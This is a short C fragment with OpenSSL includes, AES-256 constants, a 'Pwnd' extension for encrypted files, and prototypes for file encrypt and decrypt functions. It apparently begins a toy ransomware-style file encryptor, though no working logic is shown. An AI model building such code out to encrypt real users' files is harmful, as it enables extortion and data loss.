#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <openssl/rand.h>

#define BUFSIZE 1024
#define AES_256_KEY_SIZE 32
#define AES_BLOCK_SIZE 16


static const char ENCRYPT_EXT[] = "Pwnd";
static const int EXT_LEN = strlen("Pwnd");


void handleErrors(void);
int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size);
void hexa_to_bytes(char hex_string[], unsigned char val[], int size);
int encrypt(unsigned char *key, unsigned char *iv, char* plaintext_file);
int decrypt(unsigned char *key, unsigned char *iv, char* cipher_file);



